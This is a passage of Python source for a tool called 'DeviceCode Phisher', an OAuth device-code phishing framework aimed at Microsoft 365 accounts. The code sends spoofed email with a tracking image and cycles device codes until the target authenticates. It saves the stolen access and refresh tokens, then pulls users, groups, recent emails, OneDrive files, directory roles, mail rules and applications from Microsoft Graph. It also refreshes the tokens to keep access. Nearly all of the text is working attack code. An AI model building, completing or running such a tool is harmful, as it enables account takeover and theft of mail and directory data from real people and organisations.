    threading.Thread(target=srv.serve_forever, daemon=True).start()
    section("SERVER ONLINE")
    log.success(f"{proto} server listening on port {config['server_port']}")
    log.info(f"Code image  : {config['image_url']}")
    base = config["image_url"].rsplit("/", 1)[0]
    log.info(f"Landing page: {base}/verify")
    return srv


# ════════════════════════════════════════════════════════════════
#  DEVICE CODE MANAGER
# ════════════════════════════════════════════════════════════════
class DeviceCodeManager:
    def __init__(self, config):
        self.config = config
        self.current = {"user_code": "LOADING", "device_code": None}
        self.token = None
        self.lock = threading.Lock()
        self.attempt = 0
        self.views = []

    def get_code(self):
        with self.lock:
            return self.current.get("user_code", "...")

    def log_image_request(self, ip, ua):
        self.views.append({"ts": datetime.now(timezone.utc).isoformat(), "ip": ip, "ua": ua})
        log.success(f"IMAGE LOADED — {C.BOLD}Target opened email{C.X}")
        log.info(f"  Source: {ip}")

    def gen_code(self):
        try:
            r = req_lib.post(
                f"https://login.microsoftonline.com/{self.config['tenant']}/oauth2/v2.0/devicecode",
                data={"client_id": self.config["client_id"],
                      "scope": self.config.get("scope", "https://graph.microsoft.com/.default offline_access")},
                timeout=10)
            d = r.json()
            if "user_code" not in d:
                log.error(f"Code gen failed: {d.get('error_description','Unknown')}")
                return False
            with self.lock:
                self.current = d
            self.attempt += 1
            log.success(f"Device code: {C.BOLD}{C.CY}{d['user_code']}{C.X}  "
                        f"{C.DIM}(attempt {self.attempt}/{self.config['max_attempts']}){C.X}")
            return True
        except Exception as e:
            log.error(f"Code gen failed: {e}")
            return False

    def poll(self):
        with self.lock:
            dc = self.current.get("device_code")
            exp = self.current.get("expires_in", 900)
        if not dc:
            return False
        end = time.time() + exp - 30
        start = time.time()
        code = self.get_code()
        while time.time() < end and self.token is None:
            try:
                r = req_lib.post(
                    f"https://login.microsoftonline.com/{self.config['tenant']}/oauth2/v2.0/token",
                    data={"grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                          "client_id": self.config["client_id"], "device_code": dc},
                    timeout=10)
                res = r.json()
                if "access_token" in res:
                    self.token = res
                    self._save(res)
                    return True
                err = res.get("error", "")
                if err == "authorization_declined":
                    log.warning("Target DECLINED authorization")
                    return False
                elif err == "expired_token":
                    return False
            except Exception as e:
                log.error(f"Poll error: {e}")
            status_line(self.attempt, self.config["max_attempts"], code,
                       time.time() - start, len(self.views))
            time.sleep(self.config.get("code_poll_interval", 5))
        clear_line()
        return False

    def _save(self, result):
        out = {
            "captured_at": datetime.now(timezone.utc).isoformat(),
            "target": self.config["target_email"],
            "spoofed_sender": self.config["spoofed_sender"],
            "attempt": self.attempt,
            "image_views": self.views,
            "client_id": self.config["client_id"],
            "token_data": result,
        }
        with open(self.config["output_file"], "w") as f:
            json.dump(out, f, indent=2)
        clear_line()
        print()
        w = 58
        print(f"    {C.G}╔{'═' * w}╗{C.X}")
        print(f"    {C.G}║{C.X}{C.BOLD}{C.G}  ★  TOKEN CAPTURED — FULL COMPROMISE ACHIEVED  ★          {C.X}{C.G}║{C.X}")
        print(f"    {C.G}╠{'═' * w}╣{C.X}")
        print(f"    {C.G}║{C.X}  Target    : {C.CY}{self.config['target_email']:43s}{C.X}{C.G}║{C.X}")
        print(f"    {C.G}║{C.X}  Attempt   : {C.W}{str(self.attempt):43s}{C.X}{C.G}║{C.X}")
        print(f"    {C.G}║{C.X}  Img Views : {C.M}{str(len(self.views)):43s}{C.X}{C.G}║{C.X}")
        print(f"    {C.G}║{C.X}  Saved To  : {C.Y}{self.config['output_file']:43s}{C.X}{C.G}║{C.X}")
        print(f"    {C.G}╚{'═' * w}╝{C.X}")
        print()

    def run(self):
        section("PHISHING ACTIVE")
        log.info(f"Max attempts: {self.config['max_attempts']} — auto-refreshing codes")
        log.info("Waiting for target to authenticate...")
        print()
        while self.attempt < self.config["max_attempts"] and self.token is None:
            if not self.gen_code():
                time.sleep(10)
                continue
            if self.attempt == 1 and self.config.get("auto_send_email"):
                print()
                send_email(self.config)
                print()
            if self.poll():
                return True
            if self.token is None:
                log.info("Code expired — refreshing (image auto-updates)...")
                time.sleep(5)
        if self.token is None:
            log.warning(f"All {self.config['max_attempts']} attempts exhausted")
        return self.token is not None


# ════════════════════════════════════════════════════════════════
#  ATTACK RUNNER
# ════════════════════════════════════════════════════════════════
def run_attack(config):
    global log
    log = Logger(config.get("log_file"))

    # Preflight
    section("PREFLIGHT CHECKS")
    ok = True

    if shutil.which("swaks"):
        log.success("swaks installed")
    else:
        log.error("swaks not found")
        ok = False

    if config.get("tls_cert") and os.path.exists(config["tls_cert"]):
        # Check expiry
        r = run_cmd(f'openssl x509 -in "{config["tls_cert"]}" -checkend 0 -noout')
        if r.returncode == 0:
            log.success("TLS certificate valid")
        else:
            log.error("TLS certificate EXPIRED — renew before attacking")
            ok = False
    elif config.get("tls_cert"):
        log.error(f"TLS cert not found: {config['tls_cert']}")
        ok = False
    else:
        log.warning("No TLS configured — HTTP mode")

    try:
        req_lib.get("https://login.microsoftonline.com", timeout=5)
        log.success("Microsoft endpoint reachable")
    except:
        log.error("Cannot reach login.microsoftonline.com")
        ok = False

    # Check port
    port = config.get("server_port", 443)
    r = run_cmd(f"ss -tlnp | grep ':{port} '")
    if r.stdout.strip():
        log.error(f"Port {port} already in use:")
        log.info(f"  {r.stdout.strip()}")
        ok = False
    else:
        log.success(f"Port {port} available")

    if not ok:
        log.error("Fix preflight issues before continuing")
        return

    # Launch
    mgr = DeviceCodeManager(config)
    img = ImageGenerator(config)
    srv = start_server(config, mgr, img)

    try:
        if mgr.run():
            post_compromise(config["output_file"])
    except KeyboardInterrupt:
        clear_line()
        log.warning("Interrupted by user")
    finally:
        srv.shutdown()

    # Summary
    section("ENGAGEMENT SUMMARY")
    log.info(f"Code generations : {mgr.attempt}")
    log.info(f"Image loads      : {len(mgr.views)}")
    if mgr.token:
        log.critical(f"Token captured   : {C.G}{C.BOLD}YES{C.X}")
    else:
        log.warning(f"Token captured   : {C.R}NO{C.X}")
    log.info(f"Log file         : {config.get('log_file', 'N/A')}")
    print()


# ════════════════════════════════════════════════════════════════
#  POST-COMPROMISE ENUMERATION
# ════════════════════════════════════════════════════════════════
def post_compromise(token_file):
    section("POST-COMPROMISE ENUMERATION")

    if not os.path.exists(token_file):
        error(f"Token file not found: {token_file}")
        return

    with open(token_file) as f:
        data = json.load(f)

    token = data.get("token_data", data).get("access_token")
    if not token:
        error("No access_token found in file")
        return

    headers = {"Authorization": f"Bearer {token}"}
    endpoints = {
        "Identity":    "https://graph.microsoft.com/v1.0/me",
        "All Users":   "https://graph.microsoft.com/v1.0/users",
        "All Groups":  "https://graph.microsoft.com/v1.0/groups",
        "Teams":       "https://graph.microsoft.com/v1.0/me/joinedTeams",
        "Emails (5)":  "https://graph.microsoft.com/v1.0/me/messages?$top=5",
        "OneDrive":    "https://graph.microsoft.com/v1.0/me/drive/root/children",
        "Dir Roles":   "https://graph.microsoft.com/v1.0/directoryRoles",
        "Mail Rules":  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules",
        "OAuth Apps":  "https://graph.microsoft.com/v1.0/applications",
    }

    results = {}
    for name, url in endpoints.items():
        try:
            r = req_lib.get(url, headers=headers, timeout=10)
            results[name] = r.json()
            if r.status_code == 200:
                success(f"  {name}: {C.G}OK{C.X}")
            elif r.status_code == 403:
                warning(f"  {name}: {C.Y}Forbidden{C.X}")
            else:
                warning(f"  {name}: {r.status_code}")
        except Exception as e:
            error(f"  {name}: {e}")
            results[name] = {"error": str(e)}

    enum_file = token_file.replace(".json", "_enum.json")
    with open(enum_file, "w") as f:
        json.dump(results, f, indent=2)

    print()
    if "Identity" in results and "displayName" in results.get("Identity", {}):
        me = results["Identity"]
        critical(f"Compromised: {me.get('displayName')} ({me.get('userPrincipalName')})")
        info(f"  Job Title: {me.get('jobTitle', 'N/A')}")

    if "All Users" in results and "value" in results.get("All Users", {}):
        users = results["All Users"]["value"]
        success(f"Enumerated {len(users)} users:")
        for u in users:
            info(f"    {u.get('displayName','?'):30s} {u.get('userPrincipalName','?')}")

    if "Emails (5)" in results and "value" in results.get("Emails (5)", {}):
        success("Recent emails:")
        for e in results["Emails (5)"]["value"]:
            sender = e.get("from",{}).get("emailAddress",{}).get("address","?")
            info(f"    From: {sender:30s} Subj: {e.get('subject','?')[:45]}")

    print()
    success(f"Full enumeration saved to {C.BOLD}{enum_file}{C.X}")


# ════════════════════════════════════════════════════════════════
#  TOKEN REFRESH
# ════════════════════════════════════════════════════════════════
def refresh_token():
    section("TOKEN REFRESH")

    token_file = prompt("Token file path", default="token_output.json")
    if not os.path.exists(token_file):
        error(f"File not found: {token_file}")
        return

    with open(token_file) as f:
        data = json.load(f)

    rt = data.get("token_data", data).get("refresh_token")
    if not rt:
        error("No refresh_token found in file")
        return

    client_id = data.get("client_id", DEFAULT_CLIENT_ID)
    tenant = "organizations"

    info("Refreshing access token...")
    try:
        r = req_lib.post(
            f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
            data={
                "grant_type": "refresh_token",
                "client_id": client_id,
                "refresh_token": rt,
                "scope": "https://graph.microsoft.com/.default offline_access",
            }, timeout=10)
        result = r.json()

        if "access_token" in result:
            success("Token refreshed successfully!")

            # Update token file
            data["token_data"] = result
            data["refreshed_at"] = datetime.now(timezone.utc).isoformat()
            with open(token_file, "w") as f:
                json.dump(data, f, indent=2)

            success(f"Updated {token_file} with new tokens")
            info("New access token valid for ~1 hour")
        else:
            error(f"Refresh failed: {result.get('error_description', result.get('error', 'Unknown'))}")
    except Exception as e:
        error(f"Request failed: {e}")


# ════════════════════════════════════════════════════════════════
#  INFO VIEWS
# ════════════════════════════════════════════════════════════════
def show_templates():
    section("EMAIL TEMPLATES")
    for name, tpl in EMAIL_TEMPLATES.items():
        print(f"    {C.CY}{name:20s}{C.X} {C.DIM}→{C.X} {tpl['subject']}")
    print(f"\n    {C.DIM}Use custom HTML files with placeholder: {{image_url}}, {{target_name}}, {{sender_name}}{C.X}")

def show_clients():
    section("OAUTH CLIENT IDS")
    for name, cid in CLIENT_IDS.items():
        d = f" {C.G}← default{C.X}" if cid == DEFAULT_CLIENT_ID else ""
        print(f"    {C.CY}{name:20s}{C.X} {C.DIM}→{C.X} {cid}{d}")
    print(f"\n    {C.DIM}Different client IDs request different permission scopes{C.X}")


# ════════════════════════════════════════════════════════════════
#  MAIN — CLI + INTERACTIVE MENU
# ════════════════════════════════════════════════════════════════
def interactive_menu():
    while True:
        print(MENU)
        try:
            choice = input(f"    {C.CY}›{C.X} Select: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)

        if choice == "1":
            wizard_setup()
        elif choice == "2":
            wizard_attack()
        elif choice == "3":
            token_file = prompt("Token file path", default="token_output.json")
            post_compromise(token_file)
        elif choice == "4":
            refresh_token()
        elif choice == "5":
            show_templates()
        elif choice == "6":
            show_clients()
        elif choice == "0":
            print(f"\n    {C.DIM}Goodbye.{C.X}\n")
            sys.exit(0)
        else:
            warning("Invalid option")


def main():
    global log

    parser = argparse.ArgumentParser(
        description="DeviceCode Phisher — OAuth Device Code Phishing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C.CY}Modes:{C.X}
  Interactive (default):  python3 devicecode_phisher.py
  Setup wizard:           python3 devicecode_phisher.py --setup
  Attack with config:     python3 devicecode_phisher.py --attack --config config.json
  Post-compromise:        python3 devicecode_phisher.py --enumerate token_output.json
  Refresh token:          python3 devicecode_phisher.py --refresh token_output.json
        """)
    parser.add_argument("--setup", action="store_true", help="Run setup wizard")
    parser.add_argument("--attack", action="store_true", help="Launch attack (requires --config)")
    parser.add_argument("--config", help="Config file path")
    parser.add_argument("--enumerate", help="Post-compromise enum on token file")
    parser.add_argument("--refresh", help="Refresh access token from token file")
    parser.add_argument("--templates", action="store_true", help="List email templates")
    parser.add_argument("--clients", action="store_true", help="List OAuth client IDs")
    parser.add_argument("--no-email", action="store_true", help="Skip auto-sending email")

    args = parser.parse_args()

    cls()
    print(BANNER)

    if args.templates:
        show_templates()
    elif args.clients:
        show_clients()
    elif args.setup:
        wizard_setup()
    elif args.attack:
        if not args.config:
            error("--attack requires --config config.json")
            sys.exit(1)
        with open(args.config) as f:
            config = json.load(f)
        if args.no_email:
            config["auto_send_email"] = False
        run_attack(config)
    elif args.enumerate:
        post_compromise(args.enumerate)
    elif args.refresh:
        log = Logger()
        with open(args.refresh) as f:
            pass  # just validate it exists
        refresh_token.__defaults__ = None
        # Re-implement inline since we have the file
        section("TOKEN REFRESH")
        with open(args.refresh) as f:
            data = json.load(f)
        rt = data.get("token_data", data).get("refresh_token")
        if not rt:
            error("No refresh_token in file")
            return
        client_id = data.get("client_id", DEFAULT_CLIENT_ID)
        info("Refreshing...")
        r = req_lib.post("https://login.microsoftonline.com/organizations/oauth2/v2.0/token",
            data={"grant_type":"refresh_token","client_id":client_id,
                  "refresh_token":rt,"scope":"https://graph.microsoft.com/.default offline_access"},
            timeout=10)
        result = r.json()
        if "access_token" in result:
            data["token_data"] = result
            data["refreshed_at"] = datetime.now(timezone.utc).isoformat()
            with open(args.refresh, "w") as f:
                json.dump(data, f, indent=2)
            success(f"Token refreshed — saved to {args.refresh}")
        else:
            error(f"Failed: {result.get('error_description','Unknown')}")
    else:
        interactive_menu()


if __name__ == "__main__":
    main()
